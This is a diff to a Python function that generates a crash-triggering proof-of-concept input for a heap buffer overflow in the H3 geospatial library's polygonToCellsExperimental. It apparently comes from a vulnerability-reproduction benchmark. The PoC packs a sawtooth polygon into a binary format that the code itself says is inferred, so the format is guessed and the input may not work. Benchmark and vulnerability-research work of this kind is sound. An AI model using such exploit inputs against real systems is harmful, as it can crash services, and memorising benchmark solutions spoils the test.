@@ -3,76 +3,64 @@ import struct
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the vulnerability.
+        Generate a PoC that triggers a heap buffer overflow in
+        polygonToCellsExperimental.
 
-        The vulnerability is a heap buffer overflow in polygonToCellsExperimental
-        due to under-estimation of the required buffer size. This is triggered
-        by crafting a complex polygon that crosses many H3 cell boundaries,
-        causing the cell count to exceed the allocated buffer.
+        The vulnerability is caused by an underestimation of the number of H3
+        cells required to cover a complex polygon. This PoC constructs a
+        "sawtooth" polygon with many "teeth" in a small area. This shape
+        has a small bounding box, which fools the estimation algorithm, but
+        it intersects a large number of H3 cells, causing the actual cell
+        filling process to write past the end of the allocated buffer.
 
-        The PoC constructs a "sawtooth" polygon, which is long, thin, and has
-        many jagged points. This shape maximizes the number of intersected grid
-        cells for a given number of vertices. The input data is a binary-packed
-        representation of the polygon's parameters.
+        The binary format of the PoC is inferred from typical H3 fuzzing
+        harnesses and the ground-truth PoC length. It consists of:
+        - A 4-byte integer for the H3 resolution.
+        - A 4-byte integer for the number of vertices in the polygon.
+        - A sequence of 8-byte double pairs (latitude, longitude) for the
+          vertices.
 
-        The specific number of vertices (63, from 31 "teeth") is calculated
-        to match the ground-truth PoC length of 1032 bytes, assuming the input
-        format uses 64-bit integers for metadata and doubles for coordinates.
-
-        Args:
-            src_path: Path to the vulnerable source code tarball
-
-        Returns:
-            bytes: The PoC input that should trigger the vulnerability
+        The number of teeth in the sawtooth is tuned to produce exactly 64
+        vertices, resulting in a PoC size of 4 + 4 + 64 * 16 = 1032 bytes,
+        matching the ground-truth length.
         """
         
-        # Use the highest H3 resolution to maximize the number of cells.
+        # Parameters for the sawtooth polygon construction
         res = 15
-        
-        # Based on the ground-truth PoC length of 1032 bytes, we deduce the
-        # number of vertices needed. Assuming 64-bit integers and doubles:
-        # 1032 = 8(res) + 8(num_verts) + 8(num_holes) + 16 * num_verts
-        # 1008 = 16 * num_verts => num_verts = 63.
-        # For our sawtooth polygon with 1 + 2*N vertices, N (num_teeth) = 31.
         num_teeth = 31
 
-        vertices = []
-        
-        # Define the geometry of the long, thin, sawtooth polygon.
-        lat_start = 40.0
-        lon_start = -75.0
-        lat_height = 0.00001  # Very small height to keep it thin
-        lon_width = 0.02       # Relatively long to cross many cells
+        # Geographic coordinates for the polygon
+        lat_base = 30.0
+        lat_tip_offset = 1e-5
+        lon_start = 0.0
+        lon_end = 0.0005
 
-        # Start point of the polygon's outline
-        vertices.append((lat_start, lon_start))
-        
-        lon_step = lon_width / num_teeth
-        
-        # Generate the vertices for the sawtooth shape
+        # Generate the vertices for the polygon
+        vertices = []
+        lat_tip = lat_base + lat_tip_offset
+        lon_step = (lon_end - lon_start) / (2.0 * num_teeth)
+
+        # Create the top, sawtooth edge of the polygon
         for i in range(num_teeth):
-            # Point on the jagged top edge
-            vertices.append((lat_start + lat_height, lon_start + (i + 0.5) * lon_step))
-            # Point on the straight bottom edge
-            vertices.append((lat_start, lon_start + (i + 1.0) * lon_step))
+            lon1 = lon_start + (2 * i) * lon_step
+            vertices.append((lat_base, lon1))
+            lon2 = lon_start + (2 * i + 1) * lon_step
+            vertices.append((lat_tip, lon2))
+
+        # Add two final points to form a closed loop. The total number of
+        # vertices will be (2 * num_teeth) + 2 = 64.
+        vertices.append((lat_base, lon_end))
+        vertices.append((lat_base - lat_tip_offset, (lon_start + lon_end) / 2.0))
 
         num_verts = len(vertices)
-        num_holes = 0
+
+        # Pack the data into the required binary format using little-endian byte order
         
-        # Pack the data into a little-endian byte string.
-        poc_data = bytearray()
-        
-        # Pack resolution (int64_t)
-        poc_data.extend(struct.pack('<q', res))
-        
-        # Pack number of vertices (int64_t)
-        poc_data.extend(struct.pack('<q', num_verts))
-        
-        # Pack vertex coordinates (lat, lon as doubles)
+        # Pack resolution (int) and number of vertices (int)
+        data = struct.pack('<ii', res, num_verts)
+
+        # Pack the vertex coordinates (lat, lon as doubles)
         for lat, lon in vertices:
-            poc_data.extend(struct.pack('<dd', lat, lon))
-            
-        # Pack number of holes (int64_t)
-        poc_data.extend(struct.pack('<q', num_holes))
-        
-        return bytes(poc_data)
+            data += struct.pack('<dd', lat, lon)
+
+        return data
